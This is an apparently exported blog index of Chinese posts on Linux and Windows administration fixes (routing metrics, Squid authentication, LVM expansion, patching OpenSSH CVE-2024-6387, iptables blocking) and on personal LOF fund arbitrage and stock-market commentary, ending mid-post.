        <tag>troubleshooting</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>质疑标普，理解标普，加入标普</title>
    <url>/2024/0616212811.html</url>
    <content><![CDATA[<p>上周我在文章里提到过，标普信息科技LOF(161128)出现套利机会。每天申购卖出，到现在一个账户56*6&#x3D;336润。</p>
<span id="more"></span>
<p><img data-src="/2024/0616212811/image1.png"><br>得益于美股七巨头轮流领涨，161128依旧坚挺，每天溢价都是10%，成交量1个多亿，场内新增份额才400万份，根本砸不动。</p>
<p>再看看咱们村儿，马上打响第58次3000点保卫战，每天400家上涨，仅0.5万家下跌，在全球大涨时逆势走出了独立行情！我不多说，放两张图大家一看就明白：<br><img data-src="/2024/0616212811/image2.png"><br><img data-src="/2024/0616212811/image3.png"></p>
<p>161128最新的收盘价5.168，溢价依然有10%+，我会继续申购，一个账户700*10%&#x3D;70润，简直白捡钱。我相信，之前没敢参与申购的朋友，在经历了质疑标普，理解标普的过程之后，一定会选择加入标普。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>继续捡钱，每天几百块！</title>
    <url>/2024/0627215354.html</url>
    <content><![CDATA[<p><font color="red"><strong>每日操作计划：</strong></font></p>
<ul>
<li><p>标普信息科技(161128)，溢价8.5%，限购100，一拖七，单户每天700*8.5%&#x3D;59元</p>
</li>
<li><p>印度基金LOF(164824)，溢价2.6%，限购100，一拖七，单户每天700*2.6%&#x3D;18元</p>
</li>
<li><p>美元债LOF(501300)，溢价5%，限购100，场外申购转托管，单户每天100*5%&#x3D;5元</p>
</li>
</ul>
<p>预计单户每天59+18+5&#x3D;82元，10个账户820元！</p>
<span id="more"></span>

<p><font color="red"><strong>说明：</strong></font></p>
<ul>
<li><p>标普信息科技LOF溢价收缩，原因是最近美股回调，英伟达大跌。不过目前仍然有8%的溢价，继续发车!</p>
</li>
<li><p>印度股市又双叒创新高，如此强势的市场怎能错过？别嫌2个点溢价太少，3个交易日2%，年化收益200%+，吊锤粪坑A ！</p>
</li>
<li><p>美元债LOF限购100元，但无法在场内申购。只能先在场外申购，再转托管到场内卖出，整个过程需5个交易日。</p>
</li>
<li><p>美元债LOF持有的是美债，每天净值波动很小，再加上场内无法申购，砸盘力量微弱，单账户每天5元简直是无脑捡，一顿午饭钱轻松到手。</p>
</li>
</ul>
<p><img data-src="/2024/0627215354/image1.jpeg"></p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Notepad++不显示CRLF的方法</title>
    <url>/2024/0528205224.html</url>
    <content><![CDATA[<p>View -&gt; Show Symbol -&gt; 去掉勾选 Show All Characters<br><img data-src="/2024/0528205224/image1.png"></p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux双网卡默认路由metric不正确，导致SSH连接失败问题定位</title>
    <url>/2024/0627215122.html</url>
    <content><![CDATA[<h2><span id="测试环境">测试环境</span></h2><p>VMware虚拟机 RockyLinux 9 x86_64</p>
<p>双网卡：eth0(访问外网): 10.206.216.92&#x2F;24; eth1(访问内网) 192.168.1.4&#x2F;24</p>
<h2><span id="问题描述">问题描述</span></h2><p>虚拟机重启后，SSH连接失败，提示”Connection time out”，重启之前SSH连接还是正常的。</p>
<span id="more"></span>

<p><img data-src="/2024/0627215122/image1.png"></p>
<h2><span id="定位过程">定位过程</span></h2><p>登录Vmware串口，先确认sshd进程是否启动，通过ps查看sshd进程运行进程正常, netstat查看22号端口LISTEN，这一步没问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps axf | grep sshd</span><br><span class="line">    996 ?        Ss     0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups</span><br><span class="line">ss -antp | grep 22 | grep LISTEN</span><br><span class="line">LISTEN    0      128                   0.0.0.0:22                    0.0.0.0:*     <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">996</span>,fd=<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p>再通过<code>tcpdump -i eth0 port 22</code> 抓包，确认是否收到SSH请求报文，排除防火墙设置的原因。<br><img data-src="/2024/0627215122/image2.png"></p>
<p>从抓包结果看，只有收的包，没有发出去的包。再用<code>route</code>命令查看路由表，发现问题：<strong>eth0默认路由Metric值为101，大于eth1的Metric(100)，这说明eth1默认路由优先级更高，结果应答报文从eth1发出去了，导致客户端收不到应答，显示”Connection time out”</strong><br><img data-src="/2024/0627215122/image3.png"></p>
<p>通过<code>dmesg</code>查看虚拟机启动日志，发现eth1居然先于eth0 UP，所以系统自动分配给eth1的metric更小(优先级更高)。而之前SSH连接正常的时候，都是eth0先UP。<br><img data-src="/2024/0627215122/image4.png"></p>
<h2><span id="解决方法">解决方法</span></h2><p>手动设置下两个网卡的metric值，保证eth0的<code>ipv4.route-metric</code>小于eth1就行。写个脚本每次启动跑一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli connection modify eth0 ipv4.route-metric 100</span><br><span class="line">nmcli connection modify eth1 ipv4.route-metric 101</span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c up eth1</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure>
<p>查看网卡配置文件确认修改生效：<br><img data-src="/" alt="image5.png"></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
      </tags>
  </entry>
  <entry>
    <title>使用qemu-img把vmdk转成qcow2</title>
    <url>/2024/0628215859.html</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-img convert -c -f vmdk -O qcow2 vm.vmdk vm.qcow2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>RHEL9中找不到/var/log/dmesg日志文件问题</title>
    <url>/2024/0703220018.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>在Rocky Linux 9 服务器上查看启动日志，发现没有<code>/var/log/dmesg</code>文件。</p>
<h2><span id="dmesg是什么">dmesg是什么？</span></h2><p><code>dmesg</code>(diagnostic messages)用于打印<code>kernel ring buffer</code>的所有消息。 kernel会将开机信息存储在ring buffer中，如果开机时来不及查看启动信息，可以通过<code>dmesg</code>命令查看。</p>
<p><code>Kernel ring buffer</code>（内核环形缓冲区）是一种在Linux内核中使用的数据结构，用于在生产者（如硬件设备、驱动程序或内核线程）和消费者（如用户空间应用程序）之间传输数据。 这种缓冲区通常用于日志记录、性能监控、事件跟踪等场景。</p>
<span id="more"></span>

<h2><span id="rhel9找不到x2fvarx2flogx2fdmesg日志文件的原因">RHEL9找不到&#x2F;var&#x2F;log&#x2F;dmesg日志文件的原因</span></h2><p>参考：<a href="https://access.redhat.com/solutions/3748981">https://access.redhat.com/solutions/3748981</a>，这里摘录如下：</p>
<p>By design, the &#x2F;var&#x2F;log&#x2F;dmesg file is not generated during boot. The kernel ring buffer is captured within the systemd-journal as well as &#x2F;var&#x2F;log&#x2F;messages, via the imjournal rsyslog plugin.</p>
<p>翻译一下： 根据设计，在RHEL8&#x2F;RHEL9中，启动期间不会自动生成<code>/var/log/dmesg</code>文件。 内核环形缓冲区(kernel ring buffer)的消息通常会被systemd-journa捕获，存储在<code>/var/log/messages</code>或<code>journalctl</code>中。这种设计可以提供更现代化的日志管理方式，支持更好的搜索和过滤功能</p>
<h2><span id="解决方法">解决方法</span></h2><p>手动执行<code>dmesg</code>生成日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dmesg &gt; /var/log/dmesg</span><br></pre></td></tr></table></figure>
<p>或者使用 <code>journalctl</code>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl -k | tee /var/log/dmesg</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】<a href="https://en.wikipedia.org/wiki/Dmesg">https://en.wikipedia.org/wiki/Dmesg</a><br>【2】<a href="https://www.getpagespeed.com/solutions/the-var-log-dmesg-file-is-not-created-during-boot-for-rocky-linux-8">https://www.getpagespeed.com/solutions/the-var-log-dmesg-file-is-not-created-during-boot-for-rocky-linux-8</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Squid配置用户名密码的方法</title>
    <url>/2024/0703220137.html</url>
    <content><![CDATA[<h2><span id="环境">环境</span></h2><p>Centos7.9 Squid 3.5.20</p>
<h2><span id="步骤">步骤</span></h2><p>1 使用<code>htpasswd</code>工具，生成用户名密码。 例如这里添加用户名peter, 密码123.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install httpd-tools</span><br><span class="line">htpasswd -c /etc/squid/squid_user peter</span><br><span class="line">New password: 123</span><br><span class="line">Re-type new password: 123</span><br><span class="line">Adding password for user peter</span><br></pre></td></tr></table></figure>
<p>检查密码文件<code>/etc/squid/squid_user</code>，可以找到刚才添加的用户<code>peter</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/squid/squid_user</span><br><span class="line">peter:$XXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
<p>对密码文件设置适当权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown squid /etc/squid/squid_user</span><br></pre></td></tr></table></figure>
<p>验证用户名和密码是否正确, 执行<code>basic_ncsa_auth</code>程序，输入<code>peter 123</code>，显示OK说明正确。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user</span><br><span class="line">peter 123</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>2 修改squid配置文件<code>/etc/squid/squid.conf</code>，添加认证相关的配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Insert your own rules here to allow access from your clients</span><br><span class="line"></span><br><span class="line"># http_access allow localhost 加注释，表示localhost也需要认证</span><br><span class="line"></span><br><span class="line">auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user</span><br><span class="line">auth_param basic children 5</span><br><span class="line">auth_param basic realm Proxy Authentication Required</span><br><span class="line">auth_param basic credentialsttl 2 hours</span><br><span class="line">auth_param basic casesensitive on</span><br><span class="line"></span><br><span class="line">acl authUsers proxy_auth REQUIRED</span><br><span class="line">http_access allow authUsers</span><br><span class="line"></span><br><span class="line">http_access deny all</span><br></pre></td></tr></table></figure>

<p>修改配置完成后，重启Squid (<code>systemctl restart squid</code>)</p>
<h2><span id="验证">验证</span></h2><p>使用<code>curl</code>测试Squid用户名密码认证配置<br>不使用用户名密码认证，访问失败，返回407<br><img data-src="/2024/0703220137/image1.png"><br>使用正确的用户名密码认证，访问成功<br><img data-src="/2024/0703220137/image2.png"></p>
<h2><span id="参考">参考</span></h2><p>【1】<a href="https://www.cnblogs.com/blxt/p/14501176.html">Squid设置用户名密码</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>curl代理用户名或密码出现特殊字符时需要转义</title>
    <url>/2024/0704220405.html</url>
    <content><![CDATA[<p>举例：使用代理<code>127.0.0.1:3128</code>访问百度, 用户名<code>peter</code>, 密码<code>123!</code></p>
<p>密码中包含<code>！</code>特殊字符，需要转义。 查询<a href="https://www.urlencoder.org/zh/">在线URL编码工具</a>, <code>%21</code>是<code>!</code>的URL编码，<code>curl</code>使用方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x peter:123%21@127.0.0.1:3128 https://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>参考<br><a href="https://www.urlencoder.org/zh/">https://www.urlencoder.org/zh/</a></p>
]]></content>
      <categories>
        <category>curl</category>
      </categories>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>使用arping检测IP地址是否冲突</title>
    <url>/2024/0704220535.html</url>
    <content><![CDATA[<h2><span id="arping简介">arping简介</span></h2><p>在Linux中，<code>arping</code>是一个用来发送ARP请求到一个相邻主机的工具，通常用于检测网络上的IP地址冲突。</p>
<h2><span id="使用arping检测ip地址是否冲突的方法">使用arping检测IP地址是否冲突的方法</span></h2><span id="more"></span>

<p>例1：使用如下命令检测10.206.216.95是否冲突 (使用-I参数指定网络接口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># arping -I eth0 10.206.216.95</span><br><span class="line">ARPING 10.206.216.95 from 10.206.216.91 eth0</span><br><span class="line">Unicast reply from 10.206.216.95 [00:50:56:89:A7:3E]  0.627ms</span><br><span class="line">Unicast reply from 10.206.216.95 [00:50:56:89:A7:3E]  0.683ms</span><br><span class="line">Unicast reply from 10.206.216.95 [00:50:56:89:A7:3E]  0.718ms</span><br></pre></td></tr></table></figure>
<p>查看输出，发现收到了ARP应答，说明IP有冲突，且对应的MAC地址为00:50:56:89:A7:3E</p>
<p>例2：使用如下命令检测10.206.216.92是否冲突</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># arping 10.206.216.92</span><br><span class="line">ARPING 10.206.216.92 from 10.206.216.91 eth0</span><br></pre></td></tr></table></figure>
<p>查看输出，发现未收到任何ARP应答，说明IP没有冲突</p>
<h2><span id="参考">参考</span></h2><p><a href="https://man7.org/linux/man-pages/man8/arping.8.html">https://man7.org/linux/man-pages/man8/arping.8.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Win11右键默认显示更多选项的方法</title>
    <url>/2024/0706220708.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>win11系统默认右键菜单显示选项太少，每次需要点一下“显示更多选项”才能得到想要内容。比方说我用notepad++打开一个文档，在win11上要先点一下”显示更多选项“，再选择用notepad++打开，操作非常反人类。</p>
<span id="more"></span>
<p><img data-src="/2024/0706220708/image1.png"></p>
<h2><span id="win11右键默认显示更多选项的方法">Win11右键默认显示更多选项的方法</span></h2><p>1、点击开始菜单 -&gt; 打开Windows PowerShell (管理员身份运行)<br><img data-src="/2024/0706220708/image2.png"><br>2、在Windows PowerShell里输入<code>reg.exe add &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /f /ve</code> ，敲Enter执行<br><img data-src="/2024/0706220708/image3.png"><br>3、重启win11，发现修改生效<br><img data-src="/2024/0706220708/image4.png"></p>
]]></content>
      <categories>
        <category>Win</category>
      </categories>
      <tags>
        <tag>Win</tag>
      </tags>
  </entry>
  <entry>
    <title>如何修复Rocky Linux 9 OpenSSH CVE-2024-6387漏洞</title>
    <url>/2024/0710220944.html</url>
    <content><![CDATA[<p>关于漏洞的详细说明，参考Rocky官方文档：<a href="https://rockylinux.org/news/2024-07-01-openssh-sigalrm-regression">https://rockylinux.org/news/2024-07-01-openssh-sigalrm-regression</a></p>
<h2><span id="修复方法">修复方法</span></h2><p>升级OpenSSH包到Rocky官方提供的修复版本 <code>openssh-8.7p1-38.1.el9_4.security.0.7</code> 即可。方法如下：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf install -y rocky-release-security</span><br><span class="line">dnf config-manager --disable security-common</span><br><span class="line">dnf --enablerepo=security-common update openssh</span><br></pre></td></tr></table></figure>
<p>确认OpenSSH包已更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rpm -qa | grep openssh</span><br><span class="line">openssh-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">openssh-server-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">openssh-clients-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br></pre></td></tr></table></figure>



<p>如果你是基于Rocky Linux自己定制的ISO, 可以用如下命令下载OpenSSH的升级包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br><span class="line">dnf config-manager --enable security-common</span><br><span class="line">yumdownloader --downloadonly --downloaddir=./ openssh-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">yumdownloader --downloadonly --downloaddir=./ openssh-server-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">yumdownloader --downloadonly --downloaddir=./ openssh-clients-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>从Centos7升级到Rocky linux 9后，网卡连接显示Wired connection 1问题定位</title>
    <url>/2024/0712221104.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>从Centos7升级到Rocky9后, 发现网卡eth0的IP不正确。通过<code>nmcli</code>查看网卡连接，找不到name为eth0的连接，只显示’Wired connection 1’</p>
<span id="more"></span>

<p><img data-src="/2024/0712221104/image1.png"><br>查看<code>/etc/NetworkManager/system-connections/</code>，发现找不到网卡配置文件。</p>
<h2><span id="原因分析">原因分析</span></h2><p>centos7使用的网卡配置文件是ifcfg-files(<code>/etc/sysconfig/network-scripts/ifcfg-XXX</code>)，而RHEL9使用的是keyfiles(<code>/etc/NetworkManager/system-connections/XXX.nmconnection</code>)。<br>升级到Rocky 9后，需要把eth0网卡重新配置一下。</p>
<h2><span id="解决方法">解决方法</span></h2><p>使用nmcli，先删除’Wired connection 1’这个连接，再为eth0网卡生成新的连接，方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 删除 Wired connection 1 连接</span><br><span class="line">nmcli dev disconnect eth0</span><br><span class="line">nmcli con del c04f10b8-8831-3d68-9b79-2ac22907357c # nmcli con show 查找`Wired connection 1`连接的uuid，根据uuid删除连接</span><br><span class="line">ip -4 route flush dev eth0</span><br><span class="line"></span><br><span class="line"># 重新生成eth0连接 (这里设置static IP 10.206.216.91，网关10.206.216.254, dns 8.8.8.8)</span><br><span class="line">nmcli con add con-name eth0 autoconnect yes  type ethernet ifname eth0 ipv4.method manual ip4 &quot;10.206.216.91/24&quot; gw4 &quot;10.206.216.254&quot;  ipv4.dns &quot;8.8.8.8&quot;</span><br><span class="line">nmcli c up eth0</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://www.redhat.com/en/blog/rhel-9-networking-say-goodbye-ifcfg-files-and-hello-keyfiles">https://www.redhat.com/en/blog/rhel-9-networking-say-goodbye-ifcfg-files-and-hello-keyfiles</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
      </tags>
  </entry>
  <entry>
    <title>标普印度基金关门，继续套利美元债LOF</title>
    <url>/2024/0714221353.html</url>
    <content><![CDATA[<p>7月8号印度基金(164824)宣布暂停申购，7月11号标普信息科技(161128)也宣布关门。</p>
<p>我算了一下这次的套利收益，每天都参与的情况下，单个账户收益达到1800+，10个账户就是1万8。</p>
<p>再加上之前参与的全球芯片(501225), 标普500(161225), 黄金LOF(161116)，今年上半年每个账户的收益接近3000元。一家人几个账户每天参与几分钟，一万多零花钱就到手了，简直白捡钱！</p>
<span id="more"></span>

<p>随着印度和标普宣告关门，现在仅剩下美元债LOF(501300)可以稳稳套利。这只基金我之前提到过，每个账户只能场外申购100元，再转托管卖出，目前的溢价是8%，一个账户每天可以赚8块。</p>
<p><strong>以华BAO为例，说下美元债LOF套利的操作步骤：</strong></p>
<ul>
<li><p>T日，在场外申购100元，操作流程：交易 -&gt; 开放式基金 -&gt; 基金申购 -&gt; 输入代码501300，购买金额100元, 确认。</p>
</li>
<li><p>T+3日，可以查到场外申购的份额到账。做转托管操作，操作流程：交易 - 开放式基金 - 美元债LOF - 转托管</p>
</li>
<li><p>T+5日，你可以查到转托管份额到达了场内，直接卖出即可。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>川大智胜果然开盘涨停，这就是A股的尿性！</title>
    <url>/2024/0715222139.html</url>
    <content><![CDATA[<p>昨天特朗普被刺杀未遂，提前赢得了大选。今天A股的川大智胜(002253)开盘即涨停，毫无悬念。</p>
<span id="more"></span>

<p><img data-src="/2024/0715222139/image1.png"><br>不要觉得奇怪，这就是缅A一直以来的尿性！什么炒龙凤，炒麻将，炒数字，炒AI，炒美国大选，炒娱乐明星，市场资金总能在这个粪坑里不断炒出新的玄学概念，无厘头炒作堪称一绝。</p>
<p>这就是A股，一个散户交易量占主导地位的市场。大量的散户在股市里快进快出，玩击鼓传花的游戏，导致股价经常出现背离基本面的剧烈波动。有句话说得好，傻X们的共识也是共识！</p>
<p>一天抓一个涨停板，对韭菜来说，诱惑力确实相当大，但是作为普通人，还是不要妄想自己拥有这种神奇的能力。而是要关注基本面和长期价值，不被市场概念炒作左右，避免被割韭菜。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux LVM扩容方法实践</title>
    <url>/2024/0717222317.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>VMware Centos环境，根分区为LVM，大小50G，现在需要对根分区扩容。我添加了一块500G的虚拟硬盘(<code>/dev/sdb</code>)，如何把这500G扩容到根分区？</p>
<span id="more"></span>
<p><img data-src="/2024/0717222317/image1.png"></p>
<h2><span id="lvm扩容方法">LVM扩容方法</span></h2><h3><span id="1-对新磁盘分区">1. 对新磁盘分区</span></h3><p>使用<code>fdisk /dev/sdb</code>命令，进行交互式分区操作。依次输入n (new一个分区), 输入p (创建primary分区)，输入Partition number(分区编号)为1，其余选项敲回车默认，最后敲w，创建出一个新分区。<br><img data-src="/2024/0717222317/image2.png"><br>通过<code>fdisk -l /dev/sdb</code> 查看新分区已成功创建<br><img data-src="/2024/0717222317/image3.png"></p>
<h3><span id="2-格式化新分区">2. 格式化新分区</span></h3><p>先确认根分区的文件格式，先通过<code>lsblk | grep -w /</code>查到根分区的逻辑卷为<code>centos-root</code>，再通过<code>blkid</code>命令得到根分区的文件格式为<code>xfs</code><br><img data-src="/2024/0717222317/image4.png"><br>再使用<code>mkfs -t xfs /dev/sdb1</code>命令格式化新分区。（如果你的分区是<code>ext4</code>格式，就用<code>mkfs -t ext4 /dev/sdb1</code>）<br><img data-src="/2024/0717222317/image5.png"></p>
<h3><span id="3-创建物理卷">3. 创建物理卷</span></h3><p>使用<code>pvcreate /dev/sdb1</code>命令创建物理卷<br><img data-src="/2024/0717222317/image6.png"></p>
<h3><span id="4-扩展逻辑卷组">4. 扩展逻辑卷组</span></h3><p>使用<code>vgs</code>命令查询逻辑卷组(VG)的名称为<code>centos</code>，再使用<code>vgextend centos /dev/sdb1</code>命令扩展逻辑卷组<br><img data-src="/2024/0717222317/image7.png"><br><code>vgextend</code>执行后，可以看出逻辑卷组大小从511g变成1010.99g，说明扩展成功</p>
<h3><span id="5-扩展逻辑卷">5. 扩展逻辑卷</span></h3><p>使用<code>lvextend -l +100%FREE /dev/mapper/centos-root</code>命令，将所有空间扩容到逻辑卷<code>centos-root</code><br><img data-src="/2024/0717222317/image8.png"></p>
<h3><span id="6-调整文件系统大小">6. 调整文件系统大小</span></h3><p>对于<code>xfs</code>文件系统，使用<code>xfs_growfs /dev/mapper/centos-root</code>命令调整文件系统大小<br><img data-src="/2024/0717222317/image9.png"></p>
<p>最后查看效果，敲 <code>df -h </code>，发现根分区大小从50G变成550G，扩容成功！<br><img data-src="/2024/0717222317/image10.png"></p>
<h2><span id="参考">参考</span></h2><p><a href="https://www.cnblogs.com/shoufeng/p/10615452.html">Linux - 通过LVM对磁盘进行动态扩容
</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义iptables链，阻止所有进入流量的方法</title>
    <url>/2024/0723222733.html</url>
    <content><![CDATA[<h2><span id="需求描述">需求描述</span></h2><p>客户的Linux主机出现网络安全事件时, 需要先帮客户止血，再分析定位。</p>
<p>打开止血功能后，需要阻止所有进入流量(22号端口除外，系统内部流量和出去流量不受影响)；关闭止血功能后，解除限制，且原有的iptables规则要保持不变，如何实现？</p>
<h2><span id="实现方法">实现方法</span></h2><h3><span id="阻止所有进入流量的方法22号端口除外">阻止所有进入流量的方法(22号端口除外)</span></h3><ol>
<li>先自定义一个链BLOCK_IN, 新增规则: 22号端口ACCEPT, 其余端口DROP, 如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -N BLOCK_IN 							 <span class="comment"># 创建一个自定义链，名字是BLOCK_IN</span></span><br><span class="line">iptables -A BLOCK_IN -p tcp --dport 22 -j ACCEPT <span class="comment"># 允许22号端口通过</span></span><br><span class="line">iptables -A BLOCK_IN -j DROP 					 <span class="comment"># 丢弃</span></span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<ol start="2">
<li>再从INPUT链的首部新增一条规则：从网卡eth0进来的流量跳转到自定义链BLOCK_IN（注意这里把eth0替换成你机器的网卡名），如下:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -i eth0 -j BLOCK_IN</span><br></pre></td></tr></table></figure>
在另一台机器上测试端口，发现超时，再测试SSH可以连接成功，说明修改生效。 使用<code>iptables -L BLOCK_IN -v -x</code>查看接收和丢弃的流量计数。</li>
</ol>
<h3><span id="解除限制放开进入流量">解除限制，放开进入流量</span></h3><p>只需删除这个自定义链即可，原有的规则不受影响。方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT -i eth0 -j BLOCK_IN	<span class="comment"># 删除之前创建的规则，这一步不做后面删除链的时候会失败</span></span><br><span class="line">iptables -F BLOCK_IN 					<span class="comment"># 清空BLOCK_IN链的规则</span></span><br><span class="line">iptables -X BLOCK_IN 					<span class="comment"># 删除整个BLOCK_IN链</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>可转债违约是实体经济高质量发展的一大步？</title>
    <url>/2024/0818223104.html</url>
    <content><![CDATA[<p>8月14日，岭南股份公告其发行的可转债无法按期兑付，出现实质违约。8月16日，证券时报发表了一篇“雄文”《国企可转债的刚兑信仰该放下了》，引爆了舆论。</p>
<span id="more"></span>

<p><img data-src="/2024/0818223104/image1.png"></p>
<p>文章内容总结下，就是对投资者一顿批评教育，批评投资者惰性思维，执迷于国资背景的刚性兑付。结尾直接称转债违约是可转债市场的一小步，经济高质量发展的一大步，TM脸都不要了。</p>
<p>诚然，作为投资者，需要考察企业的财务状况和偿债能力，打破”下有保底上不封顶”的思维惯性。但是作为一家权威的证券媒体，搞丧事喜办，公然对违约行为唱赞歌，去鼓励上市公司逃废债，这样的行为缺乏对投资者基本的尊重，简直是令人作呕。</p>
<p>原文百度搜不到了，我找了个截图，大家感受下这篇文章什么水平。</p>
<p><img data-src="/2024/0818223104/image2.png"></p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>CLISH logout后没有执行自定义脚本问题的解决方法</title>
    <url>/2024/0819223418.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>我有一个On-Premises Appliance使用了<a href="https://clish.sourceforge.net/">CLISH</a>(思科命令行)，需要对logout操作记录auditlog。我在配置文件root-view.xml里添加了自定义脚本记录auditlog，但是脚本没有执行，auditlog没有记录。</p>
<h2><span id="解决思路">解决思路</span></h2><p>Google没查到类似案例，毕竟这年头互联网公司谁还用这种命令行呢，只好把CLISH源代码下一份，捋下流程看看解决方法,  先给出我的root-view.xml配置：</p>
<span id="more"></span>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">COMMAND</span> <span class="attr">name</span>=<span class="string">&quot;logout&quot;</span> <span class="attr">help</span>=<span class="string">&quot;Logout of the current CLI session&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ACTION</span> <span class="attr">builtin</span>=<span class="string">&quot;clish_close&quot;</span>&gt;</span>	<span class="comment">&lt;!-- 内置的clish_close方法，用于退出clish --&gt;</span></span><br><span class="line">	/usr/share/clish/scripts/basecmd.sh release #自定义的脚本，用于记录auditlog</span><br><span class="line">       <span class="tag">&lt;/<span class="name">ACTION</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">COMMAND</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看CLISH源码，看下root-view.xml中的command怎么解析的：</p>
<!-- more -->
<p><img data-src="/2024/0819223418/image1.png"></p>
<p>观察if语句发现问题所在：如果builtin存在，就不执行script。 我在配置文件里指定了builtin函数clish_close, 所以自定义的脚本没有执行。</p>
<h2><span id="解决方法">解决方法</span></h2><p>我想到两种方法：<br><strong>方法1：</strong>自行修改CLISH源码, 改C函数clish_close, 添加自定义代码。 这种方法需要自己维护源代码，不太推荐。</p>
<p><strong>方法2:</strong> 在root-view.xml里自定义action, 通过kill $PPID(直接杀死父进程)的方式退出CLISH。</p>
<p>这种方法不需修改源代码，问题是每次退出会打印一行”Terminated”，无伤大雅。 将root-view.xml配置修改如下：</p>
